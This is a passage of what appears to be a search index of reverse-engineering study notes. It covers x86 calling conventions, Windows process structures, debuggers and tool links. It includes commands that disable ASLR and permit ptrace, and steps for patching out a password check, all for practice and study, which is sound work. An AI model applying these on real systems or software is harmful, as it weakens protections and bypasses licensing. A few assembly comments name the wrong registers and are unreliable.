# push rightmost param into stack (b) push 2 # push next-rightmost param into stack (a) call _MyFunction1 # call add esp, 8 # calling function cleans (free memory) stdcall (WINAPI) Exclusively by Microsoft as the standard calling convention for the Win32 API Arguments are passed on the stack in Right - to - Left order, and return values are passed in eax . (same as __cdecl ) The called function cleans the stack, unlike CDECL. STDCALL doesn't allow variable-length argument lists. Name-decorated with a leading _ , followed by an @ , and then the number ( in bytes ) of arguments passed on the stack. This number will always be a multiple of 4, on a 32-bit aligned machine. Resulting code is smaller because clean up instructions are not repeated with each invocation. _stdcall int MyFunction2 ( int a , int b ) { return a + b ; } x = MyFunction2 ( 2 , 3 ); :_MyFunction2@8 # Function name contains info about number of bytes to clean push ebp # prologue mov ebp, esp # prologue mov eax, [ ebp + 8 ] # read 1st param into eax mov edx, [ ebp + 12 ] # read 2nd param into abx add eax, edx pop ebp # epilogue ret 8 # epilogue + called function cleans (free memory). 8 is how many bytes to pop off. push 3 # push rightmost param into stack (b) push 2 # push next-rightmost param into stack (a) call _MyFunction2@8 # call fastcall not completely standard across all compilers first 2 or 3 32-bit (or smaller) arguments are passed in registers, with the most commonly used registers being edx , eax , and ecx Additional arguments, or arguments larger than 4-bytes are passed on the stack, often in Right - to - Left order (similar to CDECL) Calling function cleans most frequently prepends an @ to the function name, and follows the function name with @x , where x is the number (in bytes) of arguments FASTCALL function doesn't need a stack frame Commonly gcc and Windows FASTCALL convention pushes parameters one and two into ecx and edx , respectively, before pushing any remaining parameters onto the stack. _fastcall int MyFunction3 ( int a , int b ) { return a + b ; } x = MyFunction3 ( 2 , 3 ); :@MyFunction3@8 push ebp # prologue mov ebp, esp # prologue add ecx, edx # a is in ecx, b is in edx pop ebp # epilogue ret # epilogue mov ecx, 2 # move rightmost param to eax mov edx, 3 # move next-rightmost param to edx call @MyFunction3@8 Read EIP (used in relocatable code ) Move return address (EIP) to the EAX register GetEIP proc mov eax , dword ptr ss : [ esp ] ret GetEIP endp Put the address of previous instruction executed into EAX. Usable to locate other parts of code in memory (by adding / subtracting to EIP value): Call _getEIP _getEIP : pop eax Heaps - Dynamically runtime allocated memory (used to store data that doesn't fit in stack) Handles - References to resources. Used by OS to control resource access. Example: To access a file need to create a file-handle using Windows API. Exceptions: Events occurred during runtime. and handlers to handle events. Hardware exceptions: Bad sequence (div by zero). OS map to error codes. Software exceptions: Windows implements: Structured Exception Handling ( SEH ) to handle both software and hardware exceptions. The CPU ring0, ring1, ring2, ring3: http://www.programmersought.com/article/47422162127/ Tracking Ring3 - Ring0 of running processes: http://www.programmersought.com/article/81722595513/;jsessionid=B89F397D53E2BA65418324AA33A1437D The CPU privilege level is divided into four levels: RING0 , RING1 , RING2 , RING3 . Windows uses only one of the two levels RING0 and RING3 ( userland ). If the application attempts to execute RING0 general instructions, then Windows will display Illegal Instruction error message. Windows Ring3 Internal Structures http://index-of.es/EBooks/nt_internals.pdf : THREAD_ENVIRONMENT_BLOCK ( TEB ) contains: Address of the top and bottom of current thread's stack Thread identifier Process thread belongs to Code of the last error Address of the Thread Local Storage ( TLS ) Address of the PROCESS_ENVIRONMENT_BLOCK ( PEB ) PROCESS_ENVIRONMENT_BLOCK ( PEB ) contains: Image base of the process Address of Loader data structure (PEB_LDR_DATA) NtGlobalFlag value ( useable in detecting debugging ) Major and minor version of Windows OS Number of processors BeingDebugged flag ( useable in detecting debugging ) CONTEXT contains: All CPU state info for thread (during internal operations) Windows APIs Ring3 OS functions Communicate with kernel function in a safe way (app to OS communication) Categories: Administration and Management Diagnostics Graphics and Multimedia Networking System Services Windows User Interface Tool categories Immunity Practice Level 1: App that branch based on password. Function that return if password is valid using two params. Change ZF New origin Substitute JMP with NOPs (Binary - Fill with NOPs) Substitute JMP to desired location (Binary - Edit and set offset to X) Inverse JMP (double click on instruction and change JNE to JE, etc.) Check params sent to check function and extract password. Save changes with right-click, save to executable. right-click save-file. Looking at memory regions PE information: Right click \"PE header\" memory section - dump in cpu - right-click in dump - special - PE header Check offset value and go to that address Beginning of section: from memory view Actual beginning of section within binary: PointerToRawData Find offset within binary: offset within code section = ( address of the instruction - start address of code section ) offset within code section + PointerToRawData of the code section = exact location within binary Tools Hex Editors Decompilers Disassemblers Debuggers Ring0 Ring3 System Monitoring Tools Windows API Monitoring Tools Diaphora - is a program diffing plugin for IDA / Ghidra: https://github.com/joxeankoret/diaphora YaDiff - is a program diffing BinDiff: Patch analysis radare2 Frida - Dynamic instrumentation toolkit for developers, reverse-engineers, and security researchers: https://www.frida.re/ angr - Python framework for analyzing binaries. It combines both static and dynamic symbolic (\"concolic\") analysis, making it applicable to a variety of tasks: https://angr.io/ GEF - GDB Enhanced Features for exploit devs reversers: https://github.com/hugsy/gef YY-CHR - Supports editing NES, SNES, Genesis, PCE, GG, WS/C, GB/C, MSX 1+2, NGP/C, SMS, and GBA graphics: https://www.romhacking.net/utilities/119/ ProcDump - ProcDump provides a convenient way for Linux developers to create core dumps of their application based on performance triggers: https://github.com/Microsoft/ProcDump-for-Linux mleak - Memory leak tracer for C programs: https://github.com/hyc/mleak Demangle function names (C/C++): http://demangler.com Collections Vagrant box with binary analysis tools: https://github.com/Hamz-a/binanalysisbox microsoft-pdb: https://github.com/Microsoft/microsoft-pdb cvdump Whatever . pdb https://github.com/Microsoft/microsoft-pdb/blob/master/cvdump/cvdump.exe How to Inspect the Content of a Program Database (PDB) File: https://www.codeproject.com/Articles/37456/How-To-Inspect-the-Content-of-a-Program-Database-P https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/debugger-download-symbols https://techcommunity.microsoft.com/t5/iis-support-blog/pdb-downloader/ba-p/342969 Language/OS Specific Linux Setup Disable ASLR: sudo sysctl - w kernel . randomize_va_space = 0 Allow ptrace processes: sudo sysctl - w kernel . yama . ptrace_scope = 0 Installing 32bit Libraries dpkg --add-architecture i386 apt-get install libc6:i386 GDB PEDA: http://ropshell.com/peda/Linux_Interactive_Exploit_Development_with_GDB_and_PEDA_Slides.pdf Run GBD with env variables: env - gdb / bin / lcars Display Information info registers info all - registers Display memory map: vmmap Display Registers / Memory: display / x $ eax x / 50 c $ eax x / s $ eax Disassemble-flavor: set disassembly - flavor intel Disassemble: disassemble $ eip Print Type Information: ptype Student Check security information: checksec References ELF Binary Mangling Part 1\u200a\u2014\u200aConcepts: https://medium.com/@dmxinajeansuit/elf-binary-mangling-part-1-concepts-e00cb1352301 Elf Binary Mangling Pt. 2: Golfin\u2019: https://medium.com/@dmxinajeansuit/elf-binary-mangling-pt-2-golfin-7e5c82bb482c Elf Binary Mangling Part 3\u200a\u2014\u200aWeaponization: https://medium.com/@dmxinajeansuit/elf-binary-mangling-part-3-weaponization-6e11971108b3 http://romainthomas.fr/slides/18-06-Recon18-Formats-Instrumentation.pdf Dissecting and exploiting ELF files: https://0x00sec.org/t/dissecting-and-exploiting-elf-files/7267 Windows Quick Reference Check DEP policy: bcdedit / enum | findstr nx Tools Collections A list of static analysis tools for Portable Executable (PE) files: https://www.peerlyst.com/posts/a-list-of-static-analysis-tools-for-portable-executable-pe-files-susan-parker?utm_source=twitter utm_medium=social utm_content=peerlyst_post utm_campaign=peerlyst_shared_post Generate call graphs from VBA code - https://github.com/MalwareCantFly/Vba2Graph libpeconv - A library to load, manipulate, dump PE files https://github.com/hasherezade/libpeconv filealyzer - Helps you explore alternate data streams, #PE/#ELF data and anomalies, file signatures, EXIF data, MZ header, #OpenSBI, #PEiD, #VirusTotal, Android and iOS app (file) info, all in one neat UI: https://www.safer-networking.org/products/filealyzer/ WinDbg - Toy scripts for playing with WinDbg JS API: https://github.com/hugsy/windbg_js_scripts HXD - Hex Editor: https://mh-nexus.de/en/hxd/ Process Explorer: to show the processes\u2019 DEP and ASLR status, I added the following columns to the view: View - Select Columns - DEP Status and View - Select Columns - ASLR Enabled Set the lower pane to view DLLs for a process and added the \u201cASLR Enabled\u201d column BinScope Binary analyzer, analyzes binaries for a wide variety of security protections: http://go.microsoft.com/?linkid=9678113 LookingGlass is a handy tool to scan a directory structure or the running processes to report which binaries do not make use of ASLR and NX: http://www.erratasec.com/lookingglass.html Defense Always make use of the exploit mitigation techniques offered by modern operating systems. Exploit mitigation techniques of Microsoft\u2019s Visual C++ 2005 SP1 and later: / GS for stack cookies/canaries / DynAMICbASE for ASLR / nxCOMPAT for dep/nx / SAfESEh for exception handler protection \u201cProtecting Your Code with Visual C++ Defenses,\u201d MSDN Magazine, March 2008, http://msdn.microsoft.com/en-us/magazine/cc337897.aspx In addition, Microsoft has released the Enhanced techniques to be applied without recompilation. The Enhanced Mitigation Experience Toolkit is available at http://blogs.technet.com/srd/archive/2010/09/02/enhanced-mitigation-experience-toolkit-emet-v2-0-0.aspx DEP http://blogs.technet.com/b/srd/archive/2009/06/12/understanding-dep-as-a-mitigation-technology-part-1.aspx Opt in to DEP programmatically: (/NXCOMPAT) at compile time, or you could use the SetProcessDEPPolicy API References Rich Header - http://bytepointer.com/articles/the_microsoft_rich_header.htm Learning binary file formats: https://board.flatassembler.net/topic.php?t=20690 https://twitter.com/grysztar/status/1088901193747845120 .NET File Format .text - Import Table, Import Address Table and .NET Section .reloc - To relocate the address which the EntryPoint instruction jumps to (it's the only address contained the IAT). The IT counts just one imported module (mscoree.dll) and one imported function (_CorExeMain for executables and _CorDllMain for dynamic load libraries). .rsrc - Main icon for an executable, since all others resources are in the .NET Section. https://www.ntcore.com/files/dotnetformat.htm https://www.red-gate.com/simple-talk/blogs/anatomy-of-a-net-assembly-pe-headers/ Dynamically load memory-only modules: Assembly.Load(byte[]) https://www.endgame.com/blog/technical-blog/hunting-memory-net-attacks .NET framework included in OS version: https://blogs.msdn.microsoft.com/astebner/2007/03/14/mailbag-what-version-of-the-net-framework-is-included-in-what-version-of-the-os/ Tools CFF Explorer: https://ntcore.com/?page_id=388 PE inspection library allowing .NET programmers to read, modify and write executable files: https://github.com/Washi1337/AsmResolver Parser for Windows Portable Executable headers: https://github.com/secana/PeNet References Reverse Engineering .NET Applications For Beginners: https://www.youtube.com/watch?v=KOVXWRrd_qg Solaris Kernel and the user space of a process share the same zero page \u201cAttacking the Core: Kernel Exploiting Notes\u201d by twiz sgrakkyu, which can be found at http://www.phrack.com/issues.html?issue=64 id=6 Each user-mode address space is unique to a particular process, while the kernel address space is shared across all processes. Mapping the NULL page in one process only causes it to be mapped in that pro- cess\u2019s address space only. References The official Solaris Modular Debugger Guide can be found at http://dlc.sun.com/osol/docs/content/MODDEBUG/moddebug.html \u201cAttacking the Core: Kernel Exploiting Notes\u201d by twiz sgrakkyu, which can be found at http://www.phrack.com/issues.html?issue=64 id=6 Virtual address space of Solaris processes can be found at http://cvs.opensolaris.org/source/xref/onnv/onnv-gate/usr/src/uts/i86pc/os/startup.c?r=10942:eaa343de0d06. Techniques Stack Based BOF Day 71: Essential Immunity Commands for OSCP and CTFs: https://medium.com/@int0x33/day-71-essential-immunity-commands-for-oscp-and-ctfs-cebfe06d935a jmp reg Null pointer dereference Kernel Code Execution Solaris bug from \"A Bug Hunter's Diary\" Exploitable user-space samples: Mark Dowd\u2019s MacGyver exploit for flash http://blogs.iss.net/archive/flash.html Justin Schuh\u2019s firefox bug http://blogs.iss.net/archive/cve-2008-0017.html FFmpeg bug from \"A Bug Hunter's Diary\" Practice https://www.malwaretech.com/beginner-malware-reversing-challenges Defense Never trust user input (this includes file data, network data, etc.). Never use unvalidated length or size values. Always define proper error conditions. Always validate return values correctly. Disassembly desynchronization: https://github.com/yellowbyte/analysis-of-anti-analysis/blob/master/research/the_return_of_disassembly_desynchronization/the_return_of_disassembly_desynchronization.md Control Flow Guard - Protects the execution flow from redirection - for example, from exploits that overwrite an address in the stack https://86hh.github.io/cfg.html References Basic Reverse Engineering with Immunity Debugger: https://www.sans.org/reading-room/whitepapers/malicious/basic-reverse-engineering-immunity-debugger-36982 101 - https://www.youtube.com/watch?v=Min6DWTHDBw feature=em-uploademail Reverse Engineering for Beginners: https://www.begin.re/ Learning Radare2 by Reversing a UMPC Bios: https://stragedevices.blogspot.com/2019/02/finding-verified-intel-atom-msrs-in.html Survival guide for Radare2 with practice: https://github.com/ZigzagSecurity/survival-guide-radare2 http://www.capstone-engine.org/showcase.html Reverse engineering simple binaries created in Fortran, C, C++, Pascal and Ada: https://www.mkdynamics.net/current_projects/computer_security/Disassembling_binaries/disassembling_binaries.html Port-oriented Programming: https://twitter.com/bxl1989/status/1085101696735268865 OALabs - WinDbg Basics for Malware Analysis: https://www.youtube.com/watch?v=QuFJpH3My7A list=PLGf_j68jNtWG_6ZwFN4kx7jfKTQXoG_BN The 101 of ELF files on Linux: Understanding and Analysis: https://linux-audit.com/elf-binaries-on-linux-understanding-and-analysis/ Ground Zero: Reverse Engineering: https://scriptdotsh.com/index.php/category/reverse-engineering/ DEF CON 26 - Alexei Bulazel - Reverse Engineering Windows Defenders Emulator: https://www.youtube.com/watch?v=2NawGCUOYT4 David Litchfield, \u201cVariations in Exploit Methods Between Linux and Windows,\u201d 2003 - https://www.blackhat.com/presentations/bh-usa-03/bh-us-03-litchfield-paper.pdf - https://www.youtube.com/watch?v=VM1PzvChNv8 ARM SUE 2017 - Reverse Engineering Embedded ARM Devices - by pancake: https://www.youtube.com/watch?v=oXSx0Qo2Upk feature=youtu.be ARM ASSEMBLY BASICS CHEATSHEET: https://azeria-labs.com/assembly-basics-cheatsheet/ GO Set of IDA Pro scripts for parsing GoLang types information stored in compiled binary: https://github.com/sibears/IDAGolangHelper Java Toold, JADX, JD-GUI, Procyon, CFR, Fernflower etc., Bytecodeviewer, dex2jar, APK tool Mobile Apps Inro: https://medium.com/@xplodwild/turning-the-frustration-of-a-mobile-game-into-a-reverse-engineering-training-a9887043efdf They updated, we dumped memory: https://blog.usejournal.com/reverse-engineering-of-a-mobile-game-part-2-they-updated-we-dumped-memory-27046efdfb85 Now, it\u2019s obfuscated: https://medium.com/@xplodwild/reverse-engineering-of-a-mobile-game-part-3-now-its-obfuscated-9c31e29c386b","title":"Reverse engineering"},{"location":"reverse-engineering/#quick-references","text":"Introduction to RE Why RE is necessary (no-support/source/malware) IA-32 CPU architecture General Purpose Registers (V1 C3.4.1): EAX - accumulator EBX - pointer to data in DS segment ECX - counter for string and loop operations EDX - I/O pointer ESI Pointer to data in the segment pointed to by the DS register Source pointer for string operations EDI Pointer to data or destination in the segment pointed to by the ES register Destination pointer for string operations ESP - Stack pointer, in the SS segment EBP - Pointer to data on the stack, in the SS segment Accessing parts of registers (EAX AH AL) EFLAGS (V1 C3.4.3) Arithmetic: OF SF ZF AF PF CF ZF SCAS CMPS (CMSB/CMPSW/CMPSD) LOOP (LOOPE/LOOPE/LOOPZ/LOOPNE/LOOPNZ) DF (direction flag) 1: String instructions auto-decrement (processed from higher to lower address) 0: String instructions auto-increment (processed from from lower to higher address) cld to **cl**ear **d**irection flag std to s**e**t **d**irection flag String operation ESI/EDI: must point to either to start/end of the string ECX must contain number of bytes to compare IOPL ( IO **p**rivilege **l**evel) - OS operations Trap Flag - Enable single step mode (debugging) Segment Registers (V1 C3.4.2) CS - code DS - data SS - stack ES - data FS - data GS - data EIP - Instruction Pointer Register = PC (V1 C3.5) Cannot access directly DR0 - DR7: Debug Registers (V3 C317.2) DR0 - DR3 are important: Used to store hardware breakpoints (addresses) Cannot be accessed directly from userland (Ring-3) In Windows use Ring 3 API and transfer execution to kernel level to update the register Machine/Model Specific Registers (V1 C3.2) Not accessible to applications, except from Time-Stamp Counter 64-bit Read using RDTSC (Read time-stamp counter) Low read to EAX High read to EDX Incremented with every clock cycle (reset when processor reset) CPU has a thread-wise context Software breakpoints work by 0xCC (int 3h) instruction. Core modification, is independent from thread context. Functions Why functions are required in a program Execution flow changes and it's required to remember where the execution was left off (and registers) Introduce stack (SS) Stack: https://en.wikibooks.org/wiki/X86_Disassembly/The_Stack Process: Contain threads Created by OS and provided with a virtual address space OS creates at least one thread, ready to be executed Thread: Has it's own stack Share the same virtual address space (of process) Time slice assigned by processor to that specific process Singe processor system: One thread at a time Multi processor system: Simultaneous threads Multi-tasking: Illusion of simultaneous execution of multiple application at the same time Multi-threading: Multiple threads that actually run in parallel PUSH POP - LIFO and bottom to top nature ESP always point to TOS is decremented to point to new place Addition decrement Removal increment Function calling (V1 C6): https://en.wikibooks.org/wiki/X86_Disassembly/Functions_and_Stack_Frames Parameters pushed to stack CALL Push return address to (return IP) ti stack Load the address of the function's entry-point (to EIP) RET POP address from TOS to EIP and resume execution RET 4. RET + increment ESP 4 bytes (used in stdcall and fastcall ) Stack frames (V1 C6) Each function need a way to store return/local variables etc. Function prologue create a frame for each function After this some GP registers stored in stack Function epilogue re-balance the stack (free memory) after execution Before this GP registers are restored prologue: https://en.wikipedia.org/wiki/Function_prologue push ebp # save base pointer mov ebp, esp # set the base-pointer, so that it points to the top of the stack sub esp, N # allocate memory for current stack frame enter N, 0 # More complex prologues can be obtained using different values (other than 0) function invocation push eax # save registers push ebx # Function body pop ebx # restore saved registers pop eax epilogue: mov esp, ebp # free memory allocated for current stack frame pop ebp # restore previous base pointer ret # exit function leave ret Calling conventions: https://en.wikibooks.org/wiki/X86_Disassembly/Calling_Conventions cdecl Arguments are passed on the stack in Right - to - Left order, and return values are passed in eax . The calling function cleans the stack. CDECL functions to have variable-length argument lists (aka variadic functions) Number of arguments is not appended to the name of the function by the compiler, and the assembler and the linker are therefore unable to determine if an incorrect number of arguments is used. CDECL functions are almost always prepended with an _ . _cdecl int MyFunction1 ( int a , int b ) { return a + b ; } x = MyFunction1 ( 2 , 3 ); _MyFunction1: push ebp # prologue mov ebp, esp # prologue mov eax, [ ebp + 8 ] # read 1st param into eax mov edx, [ ebp + 12 ] # read 2nd param into abx add eax, edx pop ebp # epilogue ret # epilogue push 3 # push rightmost param into stack (b) push 2 # push next-rightmost param into stack (a) call _MyFunction1 # call add esp, 8 # calling function cleans (free memory) stdcall (WINAPI) Exclusively by Microsoft as the standard calling convention for the Win32 API Arguments are passed on the stack in Right - to - Left order, and return values are passed in eax . (same as __cdecl ) The called function cleans the stack, unlike CDECL. STDCALL doesn't allow variable-length argument lists. Name-decorated with a leading _ , followed by an @ , and then the number ( in bytes ) of arguments passed on the stack. This number will always be a multiple of 4, on a 32-bit aligned machine. Resulting code is smaller because clean up instructions are not repeated with each invocation. _stdcall int MyFunction2 ( int a , int b ) { return a + b ; } x = MyFunction2 ( 2 , 3 ); :_MyFunction2@8 # Function name contains info about number of bytes to clean push ebp # prologue mov ebp, esp # prologue mov eax, [ ebp + 8 ] # read 1st param into eax mov edx, [ ebp + 12 ] # read 2nd param into abx add eax, edx pop ebp # epilogue ret 8 # epilogue + called function cleans (free memory). 8 is how many bytes to pop off. push 3 # push rightmost param into stack (b) push 2 # push next-rightmost param into stack (a) call _MyFunction2@8 # call fastcall not completely standard across all compilers first 2 or 3 32-bit (or smaller) arguments are passed in registers, with the most commonly used registers being edx , eax , and ecx Additional arguments, or arguments larger than 4-bytes are passed on the stack, often in Right - to - Left order (similar to CDECL) Calling function cleans most frequently prepends an @ to the function name, and follows the function name with @x , where x is the number (in bytes) of arguments FASTCALL function doesn't need a stack frame Commonly gcc and Windows FASTCALL convention pushes parameters one and two into ecx and edx , respectively, before pushing any remaining parameters onto the stack. _fastcall int MyFunction3 ( int a , int b ) { return a + b ; } x = MyFunction3 ( 2 , 3 ); :@MyFunction3@8 push ebp # prologue mov ebp, esp # prologue add ecx, edx # a is in ecx, b is in edx pop ebp # epilogue ret # epilogue mov ecx, 2 # move rightmost param to eax mov edx, 3 # move next-rightmost param to edx call @MyFunction3@8 Read EIP (used in relocatable code ) Move return address (EIP) to the EAX register GetEIP proc mov eax , dword ptr ss : [ esp ] ret GetEIP endp Put the address of previous instruction executed into EAX. Usable to locate other parts of code in memory (by adding / subtracting to EIP value): Call _getEIP _getEIP : pop eax Heaps - Dynamically runtime allocated memory (used to store data that doesn't fit in stack) Handles - References to resources. Used by OS to control resource access. Example: To access a file need to create a file-handle using Windows API. Exceptions: Events occurred during runtime. and handlers to handle events. Hardware exceptions: Bad sequence (div by zero). OS map to error codes. Software exceptions: Windows implements: Structured Exception Handling ( SEH ) to handle both software and hardware exceptions. The CPU ring0, ring1, ring2, ring3: http://www.programmersought.com/article/47422162127/ Tracking Ring3 - Ring0 of running processes: http://www.programmersought.com/article/81722595513/;jsessionid=B89F397D53E2BA65418324AA33A1437D The CPU privilege level is divided into four levels: RING0 , RING1 , RING2 , RING3 . Windows uses only one of the two levels RING0 and RING3 ( userland ). If the application attempts to execute RING0 general instructions, then Windows will display Illegal Instruction error message. Windows Ring3 Internal Structures http://index-of.es/EBooks/nt_internals.pdf : THREAD_ENVIRONMENT_BLOCK ( TEB ) contains: Address of the top and bottom of current thread's stack Thread identifier Process thread belongs to Code of the last error Address of the Thread Local Storage ( TLS ) Address of the PROCESS_ENVIRONMENT_BLOCK ( PEB ) PROCESS_ENVIRONMENT_BLOCK ( PEB ) contains: Image base of the process Address of Loader data structure (PEB_LDR_DATA) NtGlobalFlag value ( useable in detecting debugging ) Major and minor version of Windows OS Number of processors BeingDebugged flag ( useable in detecting debugging ) CONTEXT contains: All CPU state info for thread (during internal operations) Windows APIs Ring3 OS functions Communicate with kernel function in a safe way (app to OS communication) Categories: Administration and Management Diagnostics Graphics and Multimedia Networking System Services Windows User Interface Tool categories Immunity Practice Level 1: App that branch based on password. Function that return if password is valid using two params. Change ZF New origin Substitute JMP with NOPs (Binary - Fill with NOPs) Substitute JMP to desired location (Binary - Edit and set offset to X) Inverse JMP (double click on instruction and change JNE to JE, etc.) Check params sent to check function and extract password. Save changes with right-click, save to executable. right-click save-file. Looking at memory regions PE information: Right click \"PE header\" memory section - dump in cpu - right-click in dump - special - PE header Check offset value and go to that address Beginning of section: from memory view Actual beginning of section within binary: PointerToRawData Find offset within binary: offset within code section = ( address of the instruction - start address of code section ) offset within code section + PointerToRawData of the code section = exact location within binary","title":"Quick References"},{"location":"reverse-engineering/#tools","text":"Hex Editors Decompilers Disassemblers Debuggers Ring0 Ring3 System Monitoring Tools Windows API Monitoring Tools Diaphora - is a program diffing plugin for IDA / Ghidra: https://github.com/joxeankoret/diaphora YaDiff - is a program diffing BinDiff: Patch analysis radare2 Frida - Dynamic instrumentation toolkit for developers, reverse-engineers, and security researchers: https://www.frida.re/ angr - Python framework for analyzing binaries. It combines both static and dynamic symbolic (\"concolic\") analysis, making it applicable to a variety of tasks: https://angr.io/ GEF - GDB Enhanced Features for exploit devs reversers: https://github.com/hugsy/gef YY-CHR - Supports editing NES, SNES, Genesis, PCE, GG, WS/C, GB/C, MSX 1+2, NGP/C, SMS, and GBA graphics: https://www.romhacking.net/utilities/119/ ProcDump - ProcDump provides a convenient way for Linux developers to create core dumps of their application based on performance triggers: https://github.com/Microsoft/ProcDump-for-Linux mleak - Memory leak tracer for C programs: https://github.com/hyc/mleak Demangle function names (C/C++): http://demangler.com","title":"Tools"},{"location":"reverse-engineering/#collections","text":"Vagrant box with binary analysis tools: https://github.com/Hamz-a/binanalysisbox microsoft-pdb: https://github.com/Microsoft/microsoft-pdb cvdump Whatever . pdb https://github.com/Microsoft/microsoft-pdb/blob/master/cvdump/cvdump.exe How to Inspect the Content of a Program Database (PDB) File: https://www.codeproject.com/Articles/37456/How-To-Inspect-the-Content-of-a-Program-Database-P https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/debugger-download-symbols https://techcommunity.microsoft.com/t5/iis-support-blog/pdb-downloader/ba-p/342969","title":"Collections"},{"location":"reverse-engineering/#languageos-specific","text":"","title":"Language/OS Specific"},{"location":"reverse-engineering/#linux","text":"Setup Disable ASLR: sudo sysctl - w kernel . randomize_va_space = 0 Allow ptrace processes: sudo sysctl - w kernel . yama . ptrace_scope = 0 Installing 32bit Libraries dpkg --add-architecture i386 apt-get install libc6:i386 GDB PEDA: http://ropshell.com/peda/Linux_Interactive_Exploit_Development_with_GDB_and_PEDA_Slides.pdf Run GBD with env variables: env - gdb / bin / lcars Display Information info registers info all - registers Display memory map: vmmap Display Registers / Memory: display / x $ eax x / 50 c $ eax x / s $ eax Disassemble-flavor: set disassembly - flavor intel Disassemble: disassemble $ eip Print Type Information: ptype Student Check security information: checksec References ELF Binary Mangling Part 1\u200a\u2014\u200aConcepts: https://medium.com/@dmxinajeansuit/elf-binary-mangling-part-1-concepts-e00cb1352301 Elf Binary Mangling Pt. 2: Golfin\u2019: https://medium.com/@dmxinajeansuit/elf-binary-mangling-pt-2-golfin-7e5c82bb482c Elf Binary Mangling Part 3\u200a\u2014\u200aWeaponization: https://medium.com/@dmxinajeansuit/elf-binary-mangling-part-3-weaponization-6e11971108b3 http://romainthomas.fr/slides/18-06-Recon18-Formats-Instrumentation.pdf Dissecting and exploiting ELF files: https://0x00sec.org/t/dissecting-and-exploiting-elf-files/7267","title":"Linux"},{"location":"reverse-engineering/#windows","text":"Quick Reference Check DEP policy: bcdedit / enum | findstr nx Tools Collections A list of static analysis tools for Portable Executable (PE) files: https://www.peerlyst.com/posts/a-list-of-static-analysis-tools-for-portable-executable-pe-files-susan-parker?utm_source=twitter utm_medium=social utm_content=peerlyst_post utm_campaign=peerlyst_shared_post Generate call graphs from VBA code - https://github.com/MalwareCantFly/Vba2Graph libpeconv - A library to load, manipulate, dump PE files https://github.com/hasherezade/libpeconv filealyzer - Helps you explore alternate data streams, #PE/#ELF data and anomalies, file signatures, EXIF data, MZ header, #OpenSBI, #PEiD, #VirusTotal, Android and iOS app (file) info, all in one neat UI: https://www.safer-networking.org/products/filealyzer/ WinDbg - Toy scripts for playing with WinDbg JS API: https://github.com/hugsy/windbg_js_scripts HXD - Hex Editor: https://mh-nexus.de/en/hxd/ Process Explorer: to show the processes\u2019 DEP and ASLR status, I added the following columns to the view: View - Select Columns - DEP Status and View - Select Columns - ASLR Enabled Set the lower pane to view DLLs for a process and added the \u201cASLR Enabled\u201d column BinScope Binary analyzer, analyzes binaries for a wide variety of security protections: http://go.microsoft.com/?linkid=9678113 LookingGlass is a handy tool to scan a directory structure or the running processes to report which binaries do not make use of ASLR and NX: http://www.erratasec.com/lookingglass.html Defense Always make use of the exploit mitigation techniques offered by modern operating systems. Exploit mitigation techniques of Microsoft\u2019s Visual C++ 2005 SP1 and later: / GS for stack cookies/canaries / DynAMICbASE for ASLR / nxCOMPAT for dep/nx / SAfESEh for exception handler protection \u201cProtecting Your Code with Visual C++ Defenses,\u201d MSDN Magazine, March 2008, http://msdn.microsoft.com/en-us/magazine/cc337897.aspx In addition, Microsoft has released the Enhanced techniques to be applied without recompilation. The Enhanced Mitigation Experience Toolkit is available at http://blogs.technet.com/srd/archive/2010/09/02/enhanced-mitigation-experience-toolkit-emet-v2-0-0.aspx DEP http://blogs.technet.com/b/srd/archive/2009/06/12/understanding-dep-as-a-mitigation-technology-part-1.aspx Opt in to DEP programmatically: (/NXCOMPAT) at compile time, or you could use the SetProcessDEPPolicy API References Rich Header - http://bytepointer.com/articles/the_microsoft_rich_header.htm Learning binary file formats: https://board.flatassembler.net/topic.php?t=20690 https://twitter.com/grysztar/status/1088901193747845120","title":"Windows"},{"location":"reverse-engineering/#net","text":"File Format .text - Import Table, Import Address Table and .NET Section .reloc - To relocate the address which the EntryPoint instruction jumps to (it's the only address contained the IAT). The IT counts just one imported module (mscoree.dll) and one imported function (_CorExeMain for executables and _CorDllMain for dynamic load libraries). .rsrc - Main icon for an executable, since all others resources are in the .NET Section. https://www.ntcore.com/files/dotnetformat.htm https://www.red-gate.com/simple-talk/blogs/anatomy-of-a-net-assembly-pe-headers/ Dynamically load memory-only modules: Assembly.Load(byte[]) https://www.endgame.com/blog/technical-blog/hunting-memory-net-attacks .NET framework included in OS version: https://blogs.msdn.microsoft.com/astebner/2007/03/14/mailbag-what-version-of-the-net-framework-is-included-in-what-version-of-the-os/ Tools CFF Explorer: https://ntcore.com/?page_id=388 PE inspection library allowing .NET programmers to read, modify and write executable files: https://github.com/Washi1337/AsmResolver Parser for Windows Portable Executable headers: https://github.com/secana/PeNet References Reverse Engineering .NET Applications For Beginners: https://www.youtube.com/watch?v=KOVXWRrd_qg","title":".NET"},{"location":"reverse-engineering/#solaris","text":"Kernel and the user space of a process share the same zero page \u201cAttacking the Core: Kernel Exploiting Notes\u201d by twiz sgrakkyu, which can be found at http://www.phrack.com/issues.html?issue=64 id=6 Each user-mode address space is unique to a particular process, while the kernel address space is shared across all processes. Mapping the NULL page in one process only causes it to be mapped in that pro- cess\u2019s address space only. References The official Solaris Modular Debugger Guide can be found at http://dlc.sun.com/osol/docs/content/MODDEBUG/moddebug.html \u201cAttacking the Core: Kernel Exploiting Notes\u201d by twiz sgrakkyu, which can be found at http://www.phrack.com/issues.html?issue=64 id=6 Virtual address space of Solaris processes can be found at http://cvs.opensolaris.org/source/xref/onnv/onnv-gate/usr/src/uts/i86pc/os/startup.c?r=10942:eaa343de0d06.","title":"Solaris"},{"location":"reverse-engineering/#techniques","text":"Stack Based BOF Day 71: Essential Immunity Commands for OSCP and CTFs: https://medium.com/@int0x33/day-71-essential-immunity-commands-for-oscp-and-ctfs-cebfe06d935a jmp reg Null pointer dereference Kernel Code Execution Solaris bug from \"A Bug Hunter's Diary\" Exploitable user-space samples: Mark Dowd\u2019s MacGyver exploit for flash http://blogs.iss.net/archive/flash.html Justin Schuh\u2019s firefox bug http://blogs.iss.net/archive/cve-2008-0017.html FFmpeg bug from \"A Bug Hunter's Diary\"","title":"Techniques"},{"location":"reverse-engineering/#practice","text":"https://www.malwaretech.com/beginner-malware-reversing-challenges","title":"Practice"},{"location":"reverse-engineering/#defense","text":"Never trust user input (this includes file data, network data, etc.). Never use unvalidated length or size values. Always define proper error conditions. Always validate return values correctly. Disassembly desynchronization: 